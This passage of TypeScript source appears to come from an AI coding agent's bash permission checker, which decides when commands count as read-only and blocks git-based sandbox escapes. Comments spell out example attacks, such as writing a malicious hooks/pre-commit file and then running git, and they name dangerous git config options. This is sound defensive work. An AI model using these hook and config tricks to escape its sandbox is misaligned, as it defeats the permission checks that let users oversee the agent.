  for (const regex of READONLY_COMMAND_REGEXES) {
    if (regex.test(testCommand)) {
      // Prevent git commands with -c flag to avoid config options that can lead to code execution
      // The -c flag allows setting arbitrary git config values inline, including dangerous ones like
      // core.fsmonitor, diff.external, core.gitProxy, etc. that can execute arbitrary commands
      // Check for -c preceded by whitespace and followed by whitespace or equals
      // Using regex to catch spaces, tabs, and other whitespace (not part of other flags like --cached)
      if (testCommand.includes('git') && /\s-c[\s=]/.test(testCommand)) {
        return false
      }

      // Prevent git commands with --exec-path flag to avoid path manipulation that can lead to code execution
      // The --exec-path flag allows overriding the directory where git looks for executables
      if (
        testCommand.includes('git') &&
        /\s--exec-path[\s=]/.test(testCommand)
      ) {
        return false
      }

      // Prevent git commands with --config-env flag to avoid config injection via environment variables
      // The --config-env flag allows setting git config values from environment variables, which can be
      // just as dangerous as -c flag (e.g., core.fsmonitor, diff.external, core.gitProxy)
      if (
        testCommand.includes('git') &&
        /\s--config-env[\s=]/.test(testCommand)
      ) {
        return false
      }
      return true
    }
  }
  return false
}

/**
 * Checks if a compound command contains any git command.
 *
 * @param command The full command string to check
 * @returns true if any subcommand is a git command
 */
function commandHasAnyGit(command: string): boolean {
  return splitCommand_DEPRECATED(command).some(subcmd =>
    isNormalizedGitCommand(subcmd.trim()),
  )
}

/**
 * Git-internal path patterns that can be exploited for sandbox escape.
 * If a command creates these files and then runs git, the git command
 * could execute malicious hooks from the created files.
 */
const GIT_INTERNAL_PATTERNS = [
  /^HEAD$/,
  /^objects(?:\/|$)/,
  /^refs(?:\/|$)/,
  /^hooks(?:\/|$)/,
]

/**
 * Checks if a path is a git-internal path (HEAD, objects/, refs/, hooks/).
 */
function isGitInternalPath(path: string): boolean {
  // Normalize path by removing leading ./ or /
  const normalized = path.replace(/^\.?\//, '')
  return GIT_INTERNAL_PATTERNS.some(pattern => pattern.test(normalized))
}

// Commands that only delete or modify in-place (don't create new files at new paths)
const NON_CREATING_WRITE_COMMANDS = new Set(['rm', 'rmdir', 'sed'])

/**
 * Extracts write paths from a subcommand using PATH_EXTRACTORS.
 * Only returns paths for commands that can create new files/directories
 * (write/create operations excluding deletion and in-place modification).
 */
function extractWritePathsFromSubcommand(subcommand: string): string[] {
  const parseResult = tryParseShellCommand(subcommand, env => `$${env}`)
  if (!parseResult.success) return []

  const tokens = parseResult.tokens.filter(
    (t): t is string => typeof t === 'string',
  )
  if (tokens.length === 0) return []

  const baseCmd = tokens[0]
  if (!baseCmd) return []

  // Only consider commands that can create files at target paths
  if (!(baseCmd in COMMAND_OPERATION_TYPE)) {
    return []
  }
  const opType = COMMAND_OPERATION_TYPE[baseCmd as PathCommand]
  if (
    (opType !== 'write' && opType !== 'create') ||
    NON_CREATING_WRITE_COMMANDS.has(baseCmd)
  ) {
    return []
  }

  const extractor = PATH_EXTRACTORS[baseCmd as PathCommand]
  if (!extractor) return []

  return extractor(tokens.slice(1))
}

/**
 * Checks if a compound command writes to any git-internal paths.
 * This is used to detect potential sandbox escape attacks where a command
 * creates git-internal files (HEAD, objects/, refs/, hooks/) and then runs git.
 *
 * SECURITY: A compound command could bypass the bare repo detection by:
 * 1. Creating bare git repo files (HEAD, objects/, refs/, hooks/) in the same command
 * 2. Then running git, which would execute malicious hooks
 *
 * Example attack:
 * mkdir -p objects refs hooks && echo '#!/bin/bash\nmalicious' > hooks/pre-commit && touch HEAD && git status
 *
 * @param command The full command string to check
 * @returns true if any subcommand writes to git-internal paths
 */
/** @internal exported for bashPermissions cd-git-compound structure-create path */
export function commandWritesToGitInternalPaths(command: string): boolean {
  const subcommands = splitCommand_DEPRECATED(command)

  for (const subcmd of subcommands) {
    const trimmed = subcmd.trim()

    // Check write paths from path-based commands (mkdir, touch, cp, mv)
    const writePaths = extractWritePathsFromSubcommand(trimmed)
    for (const path of writePaths) {
      if (isGitInternalPath(path)) {
        return true
      }
    }

    // Check output redirections (e.g., echo x > hooks/pre-commit)
    const { redirections } = extractOutputRedirections(trimmed)
    for (const { target } of redirections) {
      if (isGitInternalPath(target)) {
        return true
      }
    }
  }

  return false
}

/**
 * Checks read-only constraints for bash commands.
 * This is the single exported function that validates whether a command is read-only.
 * It handles compound commands, sandbox mode, and safety checks.
 *
 * @param input The bash command input to validate
 * @param compoundCommandHasCd Pre-computed flag indicating if any cd command exists in the compound command.
 *                              This is computed by commandHasAnyCd() and passed in to avoid duplicate computation.
 * @returns PermissionResult indicating whether the command is read-only
 */
/** densable `K0e` — read-only analysis length cap (same 1e4 as parse Jru). */
export const READ_ONLY_ANALYSIS_MAX_LENGTH = 10000

export function checkReadOnlyConstraints(
  input: z.infer<typeof BashTool.inputSchema>,
  compoundCommandHasCd: boolean,
): PermissionResult {
  // Official 2.1.321 #1900: expand safe `"$PWD"` / `"$PWD/..."` to current cwd
  // when there is no `cd` in the compound command.
  const command = compoundCommandHasCd
    ? input.command
    : expandSafeDoubleQuotedPwd(input.command, getCwd())

  // densable F7u / 2.1.214 #4: over-length cannot be auto-allowed as read-only
  if (command.length > READ_ONLY_ANALYSIS_MAX_LENGTH) {
    return {
      behavior: 'passthrough',
      message: 'Command too long for read-only analysis',
    }
  }

  // Detect if the command is not parseable and return early
  const result = tryParseShellCommand(command, env => `$${env}`)
  if (!result.success) {
    return {
      behavior: 'passthrough',
      message: 'Command cannot be parsed, requires further permission checks',
    }
  }

  // Check the original command for safety before splitting
  // This is important because splitCommand_DEPRECATED may transform the command
  // (e.g., ${VAR} becomes $VAR)
  if (bashCommandIsSafe_DEPRECATED(command).behavior !== 'passthrough') {
    return {
      behavior: 'passthrough',
      message: 'Command is not read-only, requires further permission checks',
    }
  }

  // densable: path-mode UNC before split (backslash transforms can hide forms)
  if (containsVulnerableUncPath(command, true)) {
    return {
      behavior: 'ask',
      message:
        'Command contains Windows UNC path that could be vulnerable to WebDAV attacks',
    }
  }

  // Check once if any subcommand is a git command (used for multiple security checks below)
  const hasGitCommand = commandHasAnyGit(command)

  // SECURITY: Block compound commands that have both cd AND git
  // This prevents sandbox escape via: cd /malicious/dir && git status
  // where the malicious directory contains fake git hooks that execute arbitrary code.
  if (compoundCommandHasCd && hasGitCommand) {
    return {
      behavior: 'passthrough',
      message:
        'Compound commands with cd and git require permission checks for enhanced security',
    }
  }

  // SECURITY: Block git commands if the current directory looks like a bare/exploited git repo
  // This prevents sandbox escape when an attacker has:
  // 1. Deleted .git/HEAD to invalidate the normal git directory
  // 2. Created hooks/pre-commit or other git-internal files in the current directory
  // Git would then treat the cwd as the git directory and execute malicious hooks.
  if (hasGitCommand && isCurrentDirectoryBareGitRepo()) {
    return {
      behavior: 'passthrough',
      message:
        'Git commands in directories with bare repository structure require permission checks for enhanced security',
    }
  }

  // SECURITY: Block compound commands that write to git-internal paths AND run git
  // This prevents sandbox escape where a command creates git-internal files
  // (HEAD, objects/, refs/, hooks/) and then runs git, which would execute
  // malicious hooks from the newly created files.
  // Example attack: mkdir -p hooks && echo 'malicious' > hooks/pre-commit && git status
  if (hasGitCommand && commandWritesToGitInternalPaths(command)) {
    return {
      behavior: 'passthrough',
      message:
        'Compound commands that create git internal files and run git require permission checks for enhanced security',
    }
  }

  // SECURITY: Only auto-allow git commands as read-only if we're in the original cwd
  // (which is protected by sandbox denyWrite) or if sandbox is disabled (attack is moot).
  // Race condition: a sandboxed command can create bare repo files in a subdirectory,
  // and a backgrounded git command (e.g. sleep 10 && git status) would pass the
  // isCurrentDirectoryBareGitRepo() check at evaluation time before the files exist.
  // Official 2.1.323 #2128: on Linux with CLAUDE_CODE_SUBPROCESS_ENV_SCRUB set,
  // compare canonical paths so symlinked workspaces do not falsely fail the
  // original-cwd check and force read-only git commands to prompt / fail in -p.
  if (
    hasGitCommand &&
    SandboxManager.isSandboxingEnabled() &&
    getCwd() !== getOriginalCwd()
  ) {
    let sameRealCwd = false
    try {
      const fs = getFsImplementation()
      sameRealCwd =
        fs.realpathSync(getCwd()) === fs.realpathSync(getOriginalCwd())
    } catch {
      sameRealCwd = false
    }
    if (!sameRealCwd) {
      return {
        behavior: 'passthrough',
        message:
          'Git commands outside the original working directory require permission checks when sandbox is enabled',
      }
    }
  }

  // Check if all subcommands are read-only
  const allSubcommandsReadOnly = splitCommand_DEPRECATED(command).every(
    subcmd => {
      if (bashCommandIsSafe_DEPRECATED(subcmd).behavior !== 'passthrough') {
        return false
      }
      return isCommandReadOnly(subcmd)
    },
  )

  if (allSubcommandsReadOnly && hasGitCommand) {
    const untrustedRepoReason = checkReadOnlyGitRepositoryTrust()
    if (untrustedRepoReason !== undefined) {
      return {
        behavior: 'passthrough',
        message: untrustedRepoReason,
      }
    }
  }

  if (allSubcommandsReadOnly) {
    return {
      behavior: 'allow',
      updatedInput: input,
    }
  }

  // If not read-only, return passthrough to let other permission checks handle it
  return {
    behavior: 'passthrough',
    message: 'Command is not read-only, requires further permission checks',
  }
}

/**
 * Official 2.1.325 #2355 (`Cyo` / `qhr` @289958137):
 * When a read-only `git` command runs from a directory outside `originalCwd`,
 * verify that the git repository it resolves to belongs to the project, a
 * directory the user previously trusted, or a directory explicitly passed via
 * `--add-dir` (CLI `getAdditionalDirectoriesForClaudeMd()`), NOT merely from
 * the `permissions.additionalDirectories` setting.
 */
export function checkReadOnlyGitRepositoryTrust(
  cwd: string = getCwd(),
  originalCwd: string = getOriginalCwd(),
): string | undefined {
  if (isEnvTruthy(process.env.CLAUDE_CODE_REMOTE)) {
    return undefined
  }
  const fs = getFsImplementation()
  const canon = (p: string): string => {
    try {
      return fs.realpathSync(resolve(p))
    } catch {
      return resolve(p)
    }
  }
  const canonCwd = canon(cwd)
  const canonOriginal = canon(originalCwd)
  if (canonCwd === canonOriginal) {
    return undefined
  }
  const checkoutRoot = findGitRoot(cwd)
  if (checkoutRoot === null) {
    return undefined
  }
  const canonCheckout = canon(checkoutRoot)
  const canonCheckoutMain = canon(
    findCanonicalGitRoot(checkoutRoot) ?? checkoutRoot,
  )

  const matchesRepo = (candidateDir: string): boolean => {
    const canonCand = canon(candidateDir)
    if (canonCand === canonCheckout || canonCand === canonCheckoutMain) {
      return true
    }
    const candGit = findGitRoot(candidateDir)
    if (candGit !== null) {
      const canonCandGit = canon(candGit)
      const canonCandMain = canon(findCanonicalGitRoot(candGit) ?? candGit)
      if (
        canonCandGit === canonCheckout ||
        canonCandMain === canonCheckoutMain
      ) {
        return true
      }
    }
    return false
  }

  // 1. Same repository as the project launch directory
  if (matchesRepo(originalCwd)) {
    return undefined
  }
  // 2. Persisted trust on this checkout or its canonical repo root
  if (isPathTrusted(checkoutRoot) || isPathTrusted(canonCheckoutMain)) {
    return undefined
  }
  // 3. Explicitly named with CLI `--add-dir` (NOT `additionalDirectories` setting)
  for (const cliAddDir of getAdditionalDirectoriesForClaudeMd()) {
    if (matchesRepo(cliAddDir)) {
      return undefined
    }
  }

  return `Git would use a repository that Claude Code cannot match to this project or to one you trusted. Its settings can make git run programs. If you trust it, start Claude Code there once and accept the trust dialog, or name it with --add-dir at the start, which also loads its skills and commands. Its folder: "${checkoutRoot}"`
}
